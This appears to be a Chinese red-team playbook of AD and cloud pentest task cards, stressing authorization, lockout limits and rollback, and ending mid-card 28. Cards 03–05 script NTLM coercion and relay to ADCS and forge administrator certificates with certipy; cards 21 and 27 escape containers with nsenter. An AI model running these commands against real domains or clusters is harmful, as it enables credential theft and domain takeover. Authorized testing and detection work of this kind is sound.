# ad-cloud 任务卡（28 张）

> 源：`Tool/config/taskcard-sources.json` 的 `ad-cloud` 键（24 张上游卡）+ 4 张本地硬化卡（25 横向移动 / 26 公网外部视角 / 27 容器逃逸与集群控制面 / 28 边缘接入面与身份云）。每张卡六段；命令只在授权范围内执行。
> 统一红线：口令/hash/票据/证书私钥/AK-SK/token 只留指纹，不落明文；同账号认证失败 2 次即停。

### 01 BloodHound 采集与图谱复核（源：performing-active-directory-bloodhound-analysis）
- 触发词：BloodHound、SharpHound、域内图谱、到 Domain Admins 的路径
- 前置：有域账号（低权即可）；确认 DC/域名/DNS；授权允许 LDAP/SMB 只读采集
- 步骤：1) 先 `nxc smb <DC> --pass-pol` 读锁定策略并 `chronyc tracking` 对时；2) `bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <DC_IP> -c All --zip` 或 SharpHound `-c All`；3) 导入 Neo4j 后先查 Domain Admins 最短路径、Unconstrained/Constrained Delegation、ACL 边、ADCS 模板、会话与本地管理员复用
- 判据：图谱里存在从当前身份到高权目标的连续边，且每条边能在 LDAP 原始属性/ACL 上复现；记录采集时间与 zip 指纹
- 失败判据：采集被拒/只有部分对象、边只来自名称猜测、路径含已禁用账号或无会话主机 → 标 candidate/blocked，转 `04-kerberos-paths.md` 的单路径验证
- reference：Tool/skill/_pending/ad-cloud/references/ad-attacks.md

### 02 BloodHound 路径落到可利用动作（源：exploiting-active-directory-with-bloodhound）
- 触发词：BloodHound 路径、ACL 滥用、最短路径、域管
- 前置：已完成 01 且有一条候选路径；授权允许对目标做只读或低影响验证
- 步骤：1) 把路径拆成“凭据/ACL/委派/ADCS/会话”五类边；2) 对每条边查原始属性（`ldapsearch`/`dacledit.py -action read`）；3) 选最便宜的一条做最小验证（如 ForceChangePassword 只改测试账号、GenericAll 只读目标属性）
- 判据：边对应的原始属性/ACL 可读且与图谱一致；最小验证返回预期结果；记录前后权限对比
- 失败判据：ACL 只可读不可写、目标对象受保护/需审批、验证被拒绝 → 该边 blocked，换下一条边，不要重复写操作
- reference：Tool/skill/_pending/ad-cloud/references/ad-attacks.md

### 03 NTLM relay 打 ADCS ESC8（源：relaying-ntlm-for-adcs-esc8）
- 触发词：ESC8、relay、certsrv、NTLM relay、EPA、SMB signing
- 前置：发现 CA HTTP 端点；授权允许监听与强制认证；已确认目标网络可达
- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
  1) `nxc smb <target> -u '' -p '' --gen-relay-list relay_targets.txt` → rc=0｜期望输出：`SMB signing: False` 的目标入表；表为空 = 无可 relay 面，停。
  2) `certipy relay -ca '<CA>' -target 'http://<CA_HOST>' -template 'DomainController'` → rc=0（长驻）｜期望输出：`Got certificate!` 并落 `*.pfx`；`EPA`/`signing` 报错=面已关。
  3) `certipy auth -pfx <pfx> -dc-ip <DC_IP>` → rc=0｜期望输出：`Got TGT` + `Saving credential to .ccache`；rc=1（`KDC_ERR_*`）=证书用途/链不匹配，转 ESC1/ESC4。
  4) `nxc smb <DC_IP> -k -no-pass` → rc=0｜期望输出：`[+] <domain>\<user>`（含 `Pwn3d!`）才写 confirmed。
- 判据：relay 日志收到认证、CA 颁发了目标模板证书、`certipy auth` 出 TGT/ccache；三步缺一不可
- 失败判据：signing/EPA 已开、CA 拒绝模板、只 relay 到 LDAP、证书 auth 失败 → 停 relay，转 ESC1/ESC4 或凭据直连
- reference：Tool/skill/_pending/ad-cloud/references/ad-attacks.md

### 04 ADCS ESC1 模板验证（源：exploiting-active-directory-certificate-services-esc1）
- 触发词：ESC1、SAN、certipy req、certipy auth、证书模板
- 前置：`certipy find -vulnerable` 有输出；当前账号对目标模板有 Enroll；授权允许申请测试证书
- 步骤：1) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --help` → rc=0，期望：usage 含 `--input`/`--kind`；2) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --input Tool/cases/ad-cloud04/input/bundle.json --json` → rc=0，期望：results 中 `"kind": "adcs"` 且 `"verdict": "candidate"`；3) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`{"ok": true, "checks": 24, "kinds": 9}`
  1) `certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout` → rc=0｜期望输出：目标模板段 `ESC1 : True`、`Enroll` 含当前账号、`Manager Approval : False`。
  2) `certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -template '<Tpl>' -upn "administrator@$DOMAIN"` → rc=0｜期望输出：`Saved certificate and private key to 'administrator.pfx'`；rc=1（`CERTSRV_E_*`/`denied by policy`）=ESC1 不成立，停。
  3) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --kind adcs --input Tool/cases/ad-cloud04/input/adcs-only.json` → rc=0｜期望输出：`"kind": "adcs"`、`"verdict": "candidate"`、`checks[0].check`=`esc-rule-hit`（只拿到 pfx 就是 candidate，不是 confirmed）；rc=2 = 输入 schema 不对。
  4) `certipy auth -pfx administrator.pfx -dc-ip "$DC"` → rc=0｜期望输出：`Got TGT` + `NT hash`；rc=1（`KDC_ERR_CLIENT_REVOKED`/`KDC_ERR_PADATA_TYPE_NOSUPP`）=证书不可认证。
- 判据：pfx 的 EKU 含 Client Auth/Smart Card Logon，`certipy auth` 返回 TGT/ccache，且能访问一个只读目标
- 失败判据：无 Enroll、需审批、CA 拒绝 SAN、auth 失败 → ESC1 不成立，转 ESC4/ESC5/ESC7，不反复 req
- reference：Tool/skill/_pending/ad-cloud/references/kerberos-and-adcs.md

### 05 强制认证（PetitPotam/Coercer）前提核查（源：coercing-authentication-with-coercer-petitpotam）
- 触发词：PetitPotam、Coercer、强制认证、MS-EFSRPC、relay
- 前置：明确授权强制认证目标；有可用 relay/监听端；确认不会影响生产
- 步骤：1) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --help` → rc=0，期望：usage 含 `--kind` 与 `adcs-esc`；2) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --kind adcs-esc --input Tool/cases/ad-cloud01/input/adcs-find.json` → rc=0，期望：`"esc_flags"` 含 `ESC11`/`ESC17` 且 `"verdict": "candidate"`；3) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`{"ok": true, "checks": 24, "kinds": 9}`
  1) `nxc smb <target> -u '' -p '' -M coerce_plus -o LISTENER=<LISTENER_IP>` → rc=0｜期望输出：`Coerce+ ... EFSRPC/DFSCoerce` 命中；`STATUS_ACCESS_DENIED`=接口已补，停。
  2) `sudo responder -I eth0 -A`（或专用监听端）→ rc=0｜期望输出：`[SMB] NTLMv2-SSP Client : <target_ip>`，记时间与来源。
  3) `impacket-ntlmrelayx -t 'http://<CA_HOST>/certsrv/certfnsh.asp' -smb2support --adcs --template 'DomainController'` → rc=0｜期望输出：`GOT CERTIFICATE!` + `Writing PKCS#12 certificate`。
  4) 组合 ESC8/ESC11/ESC17 前先跑 `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --kind adcs-esc --input Tool/cases/ad-cloud01/input/adcs-find.json` → rc=0｜期望输出：`"esc_flags"` 含目标 ESC 且 `"verdict"` 非 blocked；rc=2 = 缺配置位，不许猜。
- 判据：监听端收到目标机器账号认证（含来源 IP/时间），且未造成业务中断；认证可被 relay 到授权端点
- 失败判据：目标已打补丁/接口关闭、监听收不到、强制认证触发业务告警 → 立即停，转凭据直连/其他面
- reference：Tool/skill/_pending/ad-cloud/references/ad-attacks.md

### 06 AD ACL 滥用只读核查（源：analyzing-active-directory-acl-abuse）
- 触发词：ACL、GenericAll、WriteDACL、ForceChangePassword、BloodHound 边
- 前置：有域账号；授权允许读对象 ACL；不对生产对象做写操作
- 步骤：1) `dacledit.py -action read -target <dn>` 或 BloodHound 查边；2) 区分“可读 ACL”与“当前主体可写”；3) 选测试对象验证最小动作，写操作需单独授权并备份原值
- 判据：原始 ACL 显示当前主体对目标有目标权限；最小验证成功；前后权限/属性对比可复现
- 失败判据：只有继承/只读权限、目标受 AdminSDHolder 保护、写操作被拒 → 该 ACL 边 blocked，换对象或转委派/ADCS
- reference：Tool/skill/_pending/ad-cloud/references/ad-attacks.md

### 07 域内攻击模拟的边界与节奏（源：executing-active-directory-attack-simulation）
- 触发词：攻击模拟、红队、域内演练、速率、告警
- 前置：有书面授权与资产清单；明确允许的动作等级、时间窗、禁做项
- 步骤：1) 把动作分为只读/凭据验证/提权/横向/持久化五级，逐级确认授权；2) 先只读枚举，再单账号低噪音验证；3) 全程记录命令、时间、源/目标、rc 与告警对齐
- 判据：每个动作都能映射到授权等级；没有越界资产；关键动作有前后证据与清理记录
- 失败判据：授权等级不明、资产清单外、动作触发业务异常/锁定 → 立即停并回报，不靠“应该没事”继续
- reference：Tool/skill/_pending/ad-cloud/references/01-criteria.md

### 08 DCSync 检测与只读复核（源：detecting-dcsync-attack-in-active-directory）
- 触发词：DCSync、DRSUAPI、4769、DS-Replication-Get-Changes、域控同步
- 前置：有 DC Security 日志或 EDR 遥测；授权允许读日志；不执行真实 DCSync
- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
  1) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --kind windows-events --input Tool/cases/ad-cloud03/input/security-events.json --json` → rc=0｜期望输出：`"verdict": "blocked"`、`summary.kerberos_events`=0、`summary.counts."4624"`=50、`summary.record_id_gaps`=[]
  2) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 24, "kinds": 9}`
  3) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --help` → rc=0｜期望输出：usage 含 `windows-events` 与 `ntlm-type2`
- 判据：4662 的对象 GUID 指向域命名上下文、账号具备复制权限、时间线与 4769 对齐；三条同时成立才是强证据（脚本只做离线复算，4662/4769 仍需 DC Security 日志）
- 失败判据：只有单条 4662、账号无复制权限、日志缺口/转发 → 不能写 DCSync，降级为 candidate 并补遥测
- reference：Tool/skill/_pending/ad-cloud/references/05-delegation-and-rbcd.md

### 09 域持久化的授权与清理（源：conducting-domain-persistence-with-dcsync）
- 触发词：持久化、DCSync、黄金票据、后门账号、清理
- 前置：持久化必须单独书面授权；已登记目标、手法、回滚方式与责任人
- 步骤：1) 优先选可完全回滚的测试对象；2) 记录修改前值/对象/时间；3) 验证后立即按登记回滚，并再次只读确认
- 判据：持久化动作有授权编号、前后对比、回滚成功证据；没有遗留计划任务/账号/票据
- 失败判据：无法回滚、影响生产、授权未覆盖持久化 → 停并上报（已执行的部分按回滚单处理）
- reference：Tool/skill/_pending/ad-cloud/references/02-failure-criteria.md

### 10 分层模型下的路径降噪（源：configuring-active-directory-tiered-model）
- 触发词：Tier 0、Tier 1、分层模型、域控、跳板机、凭据隔离
- 前置：有域资产清单与分层定义；授权允许只读枚举
- 步骤：1) 标注 Tier 0（DC/CA/域管）、Tier 1（服务器）、Tier 2（工作站）；2) 查跨层登录/本地管理员复用/委派；3) 优先验证跨层路径（同层低价值目标按 scope 清单取舍）
- 判据：存在跨层凭据复用或委派路径，且能在原始属性/会话上复现；记录层级与资产
- 失败判据：分层不清、无法确认资产层级、跨层路径只是名称相似 → 标 candidate，先补资产图
- reference：Tool/skill/_pending/ad-cloud/references/ad-attacks.md

### 11 蜜罐/蜜标识别与避免误报（源：deploying-active-directory-honeytokens）
- 触发词：蜜罐、honeytoken、诱饵账号、假 SPN、告警
- 前置：授权允许枚举；已知环境可能有蜜标；凭据尝试按授权单与预算执行
- 步骤：1) 查账号创建时间/登录时间/SPN/组成员是否异常“完美”；2) 查对象是否只被 BloodHound 边引用、无真实会话；3) 对可疑对象只做只读属性核对，不请求票据/不登录
- 判据：对象属性与真实业务不符（无登录、无邮箱、名称诱导、单独 OU），且多源一致；标“疑似蜜标”并停止接触
- 失败判据：无法区分真实/蜜标、对象有真实会话、请求会触发高保真告警 → 记录后换目标
- reference：Tool/skill/_pending/ad-cloud/references/03-model-pitfalls.md

### 12 AWS 提权评估的身份与策略面（源：performing-aws-privilege-escalation-assessment）
- 触发词：AWS、IAM、提权、CreatePolicyVersion、PassRole、sts
- 前置：有授权账号/凭据；只读优先；写操作单独授权并备份
- 步骤：1) `python Tool/skill/_pending/ad-cloud/scripts/cloud-iam-eval.py --input Tool/cases/ad-cloud05/input/policy.json --action iam:CreatePolicyVersion --resource '*'` → rc=0，期望：`"decision": "allow"` 且 privesc 含 `"severity": "critical"`；2) `python Tool/skill/_pending/ad-cloud/scripts/cloud-iam-eval.py --input Tool/cases/ad-cloud05/input/policy.json --action s3:GetObject --resource 'arn:aws:s3:::demo-bucket/secret/x'` → rc=0，期望：`"decision": "deny"` 且 deny_statements 非空；3) `python Tool/skill/_pending/ad-cloud/scripts/cloud-iam-eval.py --self-test` → rc=0，期望：`"ok": true`
- 判据：身份有效、策略文本允许目标动作、boundary/SCP 不拦、实际只读 API 成功；写操作需额外授权
- 失败判据：AccessDenied/ExpiredToken、显式 Deny/boundary 拦截、文本 allow 但 API 拒绝 → 提权 blocked，记录未建模项
- reference：Tool/skill/_pending/ad-cloud/references/cloud-native.md

### 13 CloudFox 云枚举的只读边界（源：enumerating-cloud-with-cloudfox）
- 触发词：CloudFox、云枚举、AWS/Azure/GCP、只读、资源面
- 前置：有有效云身份；授权允许列资源；不创建/修改/删除
- 步骤：1) 先 `sts get-caller-identity`/`az account show`/`gcloud config list` 固定身份；2) 用 CloudFox 的只读模块枚举资源与权限；3) 按“身份→权限→资源→数据”分层记录，不批量下载
- 判据：枚举结果能映射到账号/订阅/项目；关键资源有 ARN/ID 与权限来源；没有写操作
- 失败判据：身份无效、枚举被权限拒绝、结果跨出授权账号 → 停，缩小 scope 或换凭据
- reference：Tool/skill/_pending/ad-cloud/references/cloud-native.md

### 14 AWS IAM 提权检测规则（源：detecting-aws-iam-privilege-escalation）
- 触发词：IAM 提权检测、CloudTrail、CreatePolicyVersion、PassRole、AssumeRole
- 前置：有 CloudTrail/GuardDuty 或策略 JSON；授权允许读日志/策略
- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
  1) `python Tool/skill/_pending/ad-cloud/scripts/cloud-iam-eval.py --input Tool/cases/ad-cloud05/input/policy.json --action iam:CreatePolicyVersion --resource '*' --json` → rc=0｜期望输出：`"decision": "allow"`、`"privesc"[0].severity`=`"critical"`、`"matched"[0].policy`=`"CiRunnerInline"`
  2) `python Tool/skill/_pending/ad-cloud/scripts/cloud-iam-eval.py --input Tool/cases/ad-cloud05/input/policy.json --action s3:GetObject --resource 'arn:aws:s3:::demo-bucket/secret/x' --json` → rc=0｜期望输出：`"decision": "deny"` 且 `deny_statements` 非空
  3) `python Tool/skill/_pending/ad-cloud/scripts/cloud-iam-eval.py --self-test` → rc=0｜期望输出：`"ok": true`
- 判据：高风险 API 调用者、时间、策略版本、资源四者对齐；变更有实际权限提升证据（脚本只算“文本 allow”，仍需 CloudTrail 对齐）
- 失败判据：只有单条 API 无策略变更、日志缺口、调用者是合法自动化 → 误报，降级并补上下文
- reference：Tool/skill/_pending/ad-cloud/references/cloud-native.md

### 15 收敛 AWS IAM 权限的验证（源：securing-aws-iam-permissions）
- 触发词：IAM 收敛、least privilege、boundary、SCP、修复验证
- 前置：有策略修改授权；已备份原策略；有回滚计划
- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
  1) `python Tool/skill/_pending/ad-cloud/scripts/cloud-iam-eval.py --input Tool/cases/ad-cloud05/input/policy.json --action s3:GetObject --resource 'arn:aws:s3:::demo-bucket/ci/report.json' --json` → rc=0｜期望输出：`"decision": "allow"`、`deny_statements` 为空（业务路径保留）
  2) `python Tool/skill/_pending/ad-cloud/scripts/cloud-iam-eval.py --input Tool/cases/ad-cloud05/input/policy.json --action s3:GetObject --resource 'arn:aws:s3:::demo-bucket/secret/x' --json` → rc=0｜期望输出：`"decision": "deny"`、`deny_statements` 非空（越权路径被拦）
  3) `python Tool/skill/_pending/ad-cloud/scripts/cloud-iam-eval.py --self-test` → rc=0｜期望输出：`"ok": true`
- 判据：修复后目标业务动作成功、越权动作 deny、回滚路径可用；记录版本与时间（用 allow/deny 两个请求做最小回归）
- 失败判据：业务中断、boundary 误伤、无法回滚 → 立即回滚并上报，不继续收窄
- reference：Tool/skill/_pending/ad-cloud/references/02-failure-criteria.md

### 16 GCP 存储枚举的授权与判据（源：performing-gcp-penetration-testing-with-gcpbucketbrute）
- 触发词：GCP、GCS、bucket、gcpbucketbrute、公开桶
- 前置：有授权项目/域名/关键字；只读枚举；不下载对象
- 步骤：1) 固定身份 `gcloud config list`/`gcloud auth list`；2) 用 gcpbucketbrute 只读枚举候选桶；3) 对命中桶只做 `list`/`describe`，记录桶名、权限、对象数（不导出内容）
- 判据：桶存在且当前身份可 list/read，返回官方 API 响应；记录项目/桶/权限
- 失败判据：403/404、只有名称猜测、桶属于授权外项目 → 缩小 scope
- reference：Tool/skill/_pending/ad-cloud/references/cloud-native.md

### 17 Okta/云身份目录审计（源：managing-cloud-identity-with-okta）
- 触发词：Okta、IdP、SSO、MFA、应用分配、云身份
- 前置：有 Okta 只读管理员/审计日志权限；授权允许读用户/应用/策略
- 步骤：1) 枚举用户/组/应用/策略与 MFA 状态；2) 查高风险：无 MFA 管理员、宽应用分配、长期 token、异常 IdP；3) 对照审计日志时间线
- 判据：高风险配置能在 API/审计日志复现，且有明确影响（如无 MFA 管理员可登录）；记录对象 ID
- 失败判据：只有 UI 截图、无审计日志、权限不足 → 标 candidate，补只读 API/日志
- reference：Tool/skill/_pending/ad-cloud/references/cloud-native.md

### 18 Azure AD/Entra 配置审计（源：auditing-azure-active-directory-configuration）
- 触发词：Azure AD、Entra ID、条件访问、MFA、服务主体、角色
- 前置：有只读目录权限；授权允许读配置与登录日志
- 步骤：1) 枚举全局管理员/特权角色/条件访问/服务主体凭据；2) 查长期 secret/cert、过宽 API 权限、无 MFA 管理员；3) 对照 sign-in/audit log 验证
- 判据：高风险配置有对象 ID、API 返回、日志证据；能说明影响与修复
- 失败判据：只有门户截图、权限不足、配置存在但无实际可利用路径 → candidate，不写“已接管”
- reference：Tool/skill/_pending/ad-cloud/references/cloud-native.md

### 19 Kubernetes 渗透测试的只读起步（源：performing-kubernetes-penetration-testing）
- 触发词：Kubernetes、kubeconfig、API server、渗透测试、namespace
- 前置：有 kubeconfig/SA token；授权允许只读 API；不创建资源
- 步骤：1) `python `Tool/skill/_pending/ad-cloud/scripts/adcloud-check.py` --kubeconfig Tool/cases/ad-cloud01/input/kubeconfig.yaml --json` → rc=0，期望：`"ok": true`、`"current_context": "lab-context-01"`、`"insecure_skip_tls_verify": true`；2) `python `Tool/skill/_pending/ad-cloud/scripts/adcloud-check.py` --self-test` → rc=0，期望：`{"ok": true, "checks": 2}`；3) `python `Tool/skill/_pending/ad-cloud/scripts/adcloud-check.py` --help` → rc=0，期望：usage 含 `--kubeconfig`/`--aws-creds`
  1) `python `Tool/skill/_pending/ad-cloud/scripts/adcloud-check.py` --kubeconfig input/kubeconfig.yaml --json > artifacts/run.json` → rc=0｜期望输出：`"ok": true` + findings（如 `K8S-TRANSPORT-002`、`K8S-RBAC-00x`）。
  2) `kubectl config current-context` → rc=0｜期望输出：单个 context 名；rc=1 = kubeconfig 不可用，停。
  3) `kubectl auth can-i --list` → rc=0｜期望输出：`Resources`/`Verbs` 表（≥ 1 行）；`Forbidden` 或空表 = 身份无效，转 Secret/CI。
- 判据：context/token 有效、auth can-i 有明确结果、只读枚举成功；记录 API server 与 namespace
- 失败判据：token 过期、TLS/连接失败、auth can-i 全 no → 路径 blocked，转 Secret/CI 或换身份
- reference：Tool/skill/_pending/ad-cloud/references/k8s-and-container.md

### 20 K8s RBAC 提权审计（源：auditing-kubernetes-rbac-privilege-escalation）
- 触发词：RBAC、ClusterRole、RoleBinding、wildcard、escalate、bind
- 前置：有只读 RBAC 权限；授权允许读 role/clusterrole/binding
- 步骤：1) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --input Tool/cases/ad-cloud04/input/bundle.json --json` → rc=0，期望：results 含 `"kind": "k8s-rbac"` 且 `"verdict": "candidate"`；2) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --self-test` → rc=0，期望：`"kinds": 9`；3) `python `Tool/skill/_pending/ad-cloud/scripts/adcloud-check.py` --self-test` → rc=0，期望：`"ok": true`
  1) `kubectl get clusterrolebinding,rolebinding -A -o json > rbac.json` → rc=0｜期望输出：`items` ≥ 1 且 subject 含当前 SA/用户；空 `items` = 无可审面。
  2) 把绑定与当前身份整理成 `{"kind":"k8s-rbac","can_i":[...]}` 后跑 `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --kind k8s-rbac --input Tool/cases/ad-cloud04/input/k8s-rbac-only.json` → rc=0｜期望输出：`"verdict": "candidate"`、`allowed_count`=2；自建输入时 `checks[].ok` 必须与 `auth can-i` 一致；rc=2 → 打印 `{"ok": false, "blocked_at": ...}`，先修输入。
  3) `kubectl auth can-i create pods --as=system:serviceaccount:<ns>:<sa>` → rc=0｜期望输出：`yes` 才算路径成立；`no` = blocked，转 Secret/CI。
- 判据：绑定 subject 与当前身份匹配、规则确实允许目标 verb/resource、只读验证成功
- 失败判据：名称像高权但绑定窄、规则被 admission 限制、auth can-i 为 no → candidate/blocked，转 Secret/CI
- reference：Tool/skill/_pending/ad-cloud/references/k8s-and-container.md

### 21 容器逃逸到宿主的证据链（源：escaping-containers-to-host）
- 触发词：容器逃逸、privileged、hostPath、nsenter、CAP_SYS_ADMIN
- 前置：有容器内执行权限；授权允许创建测试 Pod/容器；已知清理方式
- 步骤：1) 查 CapEff/mount/cgroup/socket；2) 选最小原语（hostPath 只读优先/nsenter）；3) 只在宿主执行 `id` 或读标记文件，记录命令与清理
- 判据：宿主命名空间 `id` 或宿主文件读取成功，且能复现；Pod/容器配置与命令完整
- 失败判据：seccomp/PSA/只读挂载/用户命名空间拦住、读不到宿主 → 逃逸 blocked，换原语或转 Secret
- reference：Tool/skill/_pending/ad-cloud/references/k8s-and-container.md

### 22 K8s Pod 提权检测（源：detecting-privilege-escalation-in-kubernetes-pods）
- 触发词：Pod 提权、securityContext、capabilities、hostPID、audit
- 前置：有 K8s audit/EDR 或 Pod spec 只读权限；授权允许读日志
- 步骤：1) 查 Pod securityContext/volume/namespace 配置；2) 对齐 audit 的 create/exec/attach 与异常镜像；3) 对高风险 Pod 做只读配置复核，不进入生产 Pod
- 判据：配置允许特权/hostPath/hostPID 且 audit 有对应创建/执行；有实际宿主证据才升级为 confirmed
- 失败判据：配置存在但 PSA 拦截、audit 缺口、只在测试 namespace → candidate，补证据
- reference：Tool/skill/_pending/ad-cloud/references/k8s-and-container.md

### 23 etcd 安全评估的只读边界（源：performing-kubernetes-etcd-security-assessment）
- 触发词：etcd、2379、client cert、数据目录、K8s 控制面
- 前置：有控制面节点只读权限或 etcd 指标端点授权；不写 key
- 步骤：1) 查 etcd 监听地址/TLS/客户端证书/peer 认证；2) 只读访问 `/health`/`/metrics` 或导出快照（需授权）；3) 检查数据目录权限与备份加密
- 判据：未授权访问被拒或授权只读成功；证书/端口/权限有客观返回；不修改任何 key
- 失败判据：2379 暴露但需 mTLS、无证书、快照含敏感数据未授权 → 停，记录暴露面与修复建议
- reference：Tool/skill/_pending/ad-cloud/references/k8s-and-container.md

### 24 kube-bench CIS 基线复核（源：performing-kubernetes-cis-benchmark-with-kube-bench）
- 触发词：kube-bench、CIS、基线、master/node、配置审计
- 前置：有节点只读/Job 执行授权；明确 kube-bench 版本与 CIS 版本
- 步骤：1) 在测试节点/Job 跑 kube-bench，保存 JSON；2) 按 master/node/etcd/policies 分组看 FAIL；3) 对每条 FAIL 只读复核配置文件与运行参数，区分“基线不合规”与“可利用”
- 判据：FAIL 项有配置文件/进程参数证据；能映射到具体风险与修复；不把 FAIL 直接写成提权
- 失败判据：版本不匹配、权限不足、FAIL 项被托管服务覆盖 → 标 unknown/未覆盖，不硬套 CIS
- reference：Tool/skill/_pending/ad-cloud/references/k8s-and-container.md

### 25 横向移动路径选择与目标侧证据（源：本地硬化）
- 触发词：横向移动、PtH、WMI、WinRM、schtasks、DCOM、RBCD、4624 类型 3、4688
- 前置：已有口令/hash/票据或 relay 入站认证；授权清单含源主机、目标主机、目标账号；写操作（建服务/计划任务/RBCD）单独授权
- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
  1) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --input Tool/cases/ad-cloud04/input/bundle.json --json` → rc=0｜期望输出：`results` 5 条且 `"summary": {"candidate": 5}`；`kind=delegation` 的 `accounts[0].ticket_obtained`=false、`paths` 含 `unconstrained`（有委派属性但无票据 → 只能写 candidate）
  2) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --kind windows-events --input Tool/cases/ad-cloud03/input/security-events.json --json` → rc=0｜期望输出：`"verdict": "blocked"`、`summary.counts."4624"`=50、`summary.kerberos_events`=0（单机无域事件 → 不能证明横向成功）
  3) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 24, "kinds": 9}`
- 判据：目标侧出现预期身份的 4688（父进程 WmiPrvSE.exe/mmc.exe/services.exe）、7045、4698 或命令回显，且与 4624 类型 3 的账号/来源/时间对齐；relay 额外要目标 4624+4776；只认证成功/ReturnValue=0 不算
- 失败判据：目标无 4688/7045/4698/回显、认证 SUCCEED 无会话、Access denied/0x80070005、SMB/LDAP signing 强制 → 当前手法 blocked，按 `06-lateral-movement.md` 的四列换面，不重复 relay
- reference：Tool/skill/_pending/ad-cloud/references/06-lateral-movement.md

### 26 公网 445/389/88 外部视角只读核查（源：本地硬化）
- 触发词：公网、445、389、88、NTLM type 2、LDAP 匿名、Kerberos 用户名枚举、只读
- 前置：授权清单只有 IP/域名；允许只读协商/绑定/AS-REQ；书面禁止爆破、写、投毒（LLMNR/NBT-NS/WPAD/伪造 DC/票据注入）
- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
  1) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --kind ntlm-type2 --input Tool/cases/ad-cloud01/input/ntlm-type2.json --json` → rc=0｜期望输出：`"verdict": "candidate"`、`"dns_domain": "corp.local"`、`"os_version": "10.0.20348"`、`"timestamp": "2026-10-21T14:00:00Z"`、`"auth_attempted": false`（只解析，不发认证）
  2) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 24, "kinds": 9}`
  3) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --help` → rc=0｜期望输出：usage 含 `ntlm-type2` 与 `--kind`
- 判据：type 2 能解析出域/OS/时间戳只到 candidate；LDAP rootDSE resultCode=0 只到 candidate；KDC 错误码 6/25/AS-REP 可分类；challenge 只留指纹；全程未爆破、未写、未投毒
- 失败判据：只有端口开放无协议响应、type 2 解析失败、LDAP 匿名 49/8、KDC 只回 25、时差 >5 分钟 → 记 blocked/unknown，不得用口令字典或写入把“只读枚举”升级成验证
- reference：Tool/skill/_pending/ad-cloud/references/ad-attacks.md

### 27 容器逃逸与集群控制面（privileged/hostPath/kubelet/etcd）四列判据（源：本地硬化）
- 触发词：容器逃逸、privileged、hostPath、cgroup release_agent、runc、kubelet、etcd、admission、PSA
- 前置：有容器内执行权限/SA token/kubeconfig；授权允许只读 API，创建标记 Pod 需单独授权；已登记清理方式
- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
  1) `python `Tool/skill/_pending/ad-cloud/scripts/adcloud-check.py` --kubeconfig Tool/cases/ad-cloud01/input/kubeconfig.yaml --json` → rc=0｜期望输出：`"ok": true`、`"current_context": "lab-context-01"`、`"insecure_skip_tls_verify": true`、`anonymous_risk`=false、findings 含 `K8S-TRANSPORT-002`/`K8S-RBAC-003`/`K8S-RBAC-006`
  2) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --kind k8s-rbac --input Tool/cases/ad-cloud04/input/k8s-rbac-only.json --json` → rc=0｜期望输出：`"kind": "k8s-rbac"`、`"verdict": "candidate"`、`allowed_count`=2、`checks` 5 条，且 `host-proof`=false / `secret-proof`=false（有权限面但无宿主证据 → 只能 candidate）
  3) `python Tool/skill/_pending/ad-cloud/scripts/ad-repro.py --self-test` → rc=0｜期望输出：`{"ok": true, "checks": 24, "kinds": 9}`
  4) 容器内原语：`capsh --print`、`stat -fc %T /sys/fs/cgroup/`、`test -w /var/run/docker.sock`；宿主侧：`nsenter -t 1 -m -u -i -n -p -- hostname`（仅授权容器；rc=0 且返回节点 hostname ≠ 容器 hostname 才升级 confirmed）
- 判据：容器内原语可机检为真 + 宿主侧独立证据（节点 hostname/节点文件哈希/节点 auditd）+ `auth can-i` yes 后实际动作成功；缺宿主证据最高 candidate
- 失败判据：缺 CAP_SYS_ADMIN/只读挂载/seccomp、cgroup v2 无 release_agent、runc 已升级、10255 只读、etcd 只回 version/health、PSA/Quota 拒 → 对应原语 blocked，按 `k8s-and-container.md` 3.5/4 节换面，不反复提权
- reference：Tool/skill/_pending/ad-cloud/references/k8s-and-container.md

### 28 边缘接入面与身份云只读指纹（VPN/OWA/Zimbra/Okta/Entra）（源：本地硬化）
- 触发词：SSL VPN、AnyConnect、FortiGate、NetScaler、GlobalProtect、OWA、Zimbra、Okta、Entra、NTLM type 2
- 前置：清单只有域名/IP；书面允许只读指纹与公开 metadata；禁止提交凭据、口令喷洒、用户枚举、投毒
- 步骤：（剧本：命令 → 退出码 → 期望输出；rc≠0 即停）
